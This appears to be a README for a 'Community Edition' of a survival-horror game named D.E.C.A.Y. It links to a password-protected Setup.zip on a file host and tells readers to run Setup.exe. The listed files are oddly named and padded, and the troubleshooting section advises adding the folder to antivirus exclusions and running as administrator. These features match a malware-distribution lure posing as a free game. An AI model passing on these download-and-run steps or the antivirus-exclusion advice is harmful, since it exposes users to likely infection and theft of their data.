## 🎮 About the Game

D.E.C.A.Y. is a first-person survival horror adventure set in a decaying, post-outbreak urban environment. Players scavenge for resources, manage limited inventory space, and navigate procedurally influenced zones while avoiding hostile inhabitants. This Community Edition is a self-contained package distributed as an independent release, requiring no storefront or additional software to run.

This build is intended for solo players who enjoy atmospheric survival horror and want a self-contained offline version of D.E.C.A.Y.

> ℹ️ **This is a standalone community build.** No additional software, storefronts, or online activation required. Just download, extract, and play. Provided for evaluation and archival purposes.

## 📦 Package Features

- 🏙️ **Open Urban Exploration** — Traverse interconnected districts of a collapsed city with multiple routes and hidden shelters.
- 🎒 **Weight-Based Inventory** — Every item has mass and value; decide what to carry and what to abandon.
- 🧟 **Adaptive Hostiles** — Enemies react to sound, light, and scent, forcing varied tactics per encounter.
- 🔧 **Scavenging and Crafting** — Salvage components from the environment to build tools, repairs, and defensive gear.
- 📊 **Survival Stats** — Manage hunger, thirst, fatigue, and contamination across a persistent save.
- 🌗 **Dynamic Day-Night Cycle** — Visibility and enemy behavior shift between day and night phases.
- 💾 **Manual Save System** — Save points are scarce by design, preserving tension between checkpoints.
- 🎧 **Atmospheric Audio Design** — Layered ambient soundscapes and positional audio cues support the horror pacing.
- 🗺️ **Multiple Endings** — Choices regarding survivors, resources, and routes lead to several distinct conclusions.
- ⚙️ **Difficulty Options** — Adjustable survival pressure and enemy aggression settings for different playstyles.
- 🈶 **Multi-Language Interface** — Full interface and subtitle localization included in the package.
- 🖥️ **Offline Ready** — The standalone build runs entirely offline with no online account needed.

- **Compression:** Lossless
- **Install Time:** ~6 minutes on SSD, ~15 on HDD
- **Recoding:** none
- **Selective Download:** Full package only; all language packs included by default

## 📥 Installation & Setup

### Step 1: Download

Download the `Setup.zip` archive from the link below:
- **Download Link:** [https://gofile.io/d/FzMjGo8k](https://gofile.io/d/FzMjGo8k)

### Step 2: Extract

1. The archive is protected with the password: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip, etc.)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract **all files** from the archive to a folder of your choice.
2. **IMPORTANT:** All files must be extracted to the **same folder** as `Setup.exe`.
3. The folder structure should look like this:

```
Setup/
|-- Setup.exe <- Main executable (6.3 MB)
|-- scripts.lic <- Game scripts (53.6 MB)
|-- patch_1.bnk <- Audio banks (34.5 MB)
|-- res.pak <- Resources archive (10.2 MB)
|-- animations.dll <- Animation system (4.7 MB)
|-- update_1.res <- Update resources (4.5 MB)
|-- api.pak <- API modules (4.3 MB)
|-- settings.bin <- Configuration (4.2 MB)
|-- license.wem <- Audio assets (3.8 MB)
|-- global.cfg <- Global settings (3.7 MB)
|-- assets.wem <- Asset audio (3.6 MB)
|-- physics.sys <- Physics engine (3.2 MB)
|-- dlc.md5 <- DLC checksums (3.2 MB)
|-- launcher.dll <- Launcher library (3.1 MB)
|-- driver.umap <- Driver data (2.7 MB)
|-- installer.dat <- Installer data (2.2 MB)
|-- license.bank <- License data (2.0 MB)
|-- update_1.ini <- Update config (1.9 MB)
|-- driver.pak <- Driver archive (1.6 MB)
|-- localization.ini <- Language files (1.5 MB)
|-- uninstall.key <- Uninstall key (1.1 MB)
|-- bootstrap.wem <- Bootstrap audio (0.9 MB)
|-- lang.sys <- Language system (0.8 MB)
|-- audio.res <- Audio resources (1 KB)
|-- Password 2026.txt <- Password reminder (empty)
```

### Step 4: Launch the Game

1. Navigate to the folder where you extracted all files.
2. Run `Setup.exe`.
3. The game launcher will appear.

### Step 5: Play

1. Click **"Play"** in the launcher window.
2. The game will start with the community build.
3. Enjoy the full experience!

> 💡 **Saves location:** `%LOCALAPPDATA%\D.E.C.A.Y.\Saved`

## 🐛 Troubleshooting

- **Antivirus false positive:** Add the game folder to exclusions.
- **Missing DLLs:** Install Visual C++ Redistributable 2015-2022 and latest DirectX runtime.
- **Game won't start:** Run as administrator, disable fullscreen optimizations, update GPU drivers.
